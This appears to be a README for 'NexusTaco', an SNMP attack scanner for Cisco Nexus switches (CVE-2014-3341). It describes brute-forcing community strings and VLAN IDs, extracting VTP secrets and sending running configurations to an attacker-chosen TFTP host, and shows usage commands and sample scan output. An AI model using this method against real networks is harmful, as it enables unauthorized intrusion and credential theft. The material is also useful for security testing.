snmpvlan
========
CVE ID: CVE-2014-3341.

Cisco Bug ID: CSCup85616.

NexusTaco is a snmp scanner that can be used both for internal testing and external testing to assess Cisco Nexus switches ( 5000 and 6000 family). 

There are many snmp scanners and brute forcers this was made for just completeness.It has the following features: 

*Finds Nexus switches specifically since they seem to reply to bogus community strings 

*Bruteforces Vlan ID’s which can be used for Vlan hopping / double tagging attacks without a community incase #3 doesn’t come through (useful for internal tests) 

*Bruteforces snmp community strings To find the following: **System uptime **Configured networks (leverage more ground) 

  **Files and folders 

  **VTP secret and password ( can be cracked since its md5 and might be the telnet login password if exists or used somewhere else) 

  **Once a write community string is found the running configuration file will be send to your set ip in argv[2]. You need to configure a tftp server like solar winds’s one or something. 

TODO: 

*Still looking up sneaky OID’s that can provide usernames that are configured locally on the switch 

*If found private snmp CS check if a AAA server is running (and get the shared secret wether radius or TACACS+) 

*Show logged in users 

*Disable snmp traps 

*Check for port security if configured incase you need to spoof your mac so you don’t loose your port(internal tests). 

*Use getopt ….. 

*Router reload over snmp just for evilness. 

*Anything else I forgot.

$ python NexusTaco.py python NexusTaco.py CIDR 

$ python NexusTaco.py x.x.x.x/32 127.0.0.1 100 

Thanks nmap for the ip list 

Finding vulnerable switches 

x.x.x.x:Is a nexus switch, Snmp open, Has Vlans configured

Finding VlanIDs on: x.x.x.x With incorrect community string

Host: x.x.x.x has VlanID 1 Configured 

Host: x.x.x.x has VlanID 2 Configured 

Host: x.x.x.x has VlanID 3 Configured 

Host: x.x.x.x has VlanID 4 Configured 

Host: x.x.x.x has VlanID 5 Configured 

Host: x.x.x.x has VlanID 6 Configured 

Host: x.x.x.x has VlanID 7 Configured 

Host: x.x.x.x has VlanID 8 Configured 

Host: x.x.x.x has VlanID 10 Configured 

Host: x.x.x.x has VlanID 31 Configured 

Host: x.x.x.x has VlanID 32 Configured 

Host: x.x.x.x has VlanID 33 Configured 

Host: x.x.x.x has VlanID 34 Configured 

Host: x.x.x.x has VlanID 35 Configured 

Host: x.x.x.x has VlanID 40 Configured 

Host: x.x.x.x has VlanID 64 Configured 

Host: x.x.x.x has VlanID 65 Configured 

Host: x.x.x.x has VlanID 97 Configured 

Host: x.x.x.x has VlanID 98 Configured 

Host: x.x.x.x has VlanID 99 Configured 

Host: x.x.x.x has VlanID 100 Configured

.....
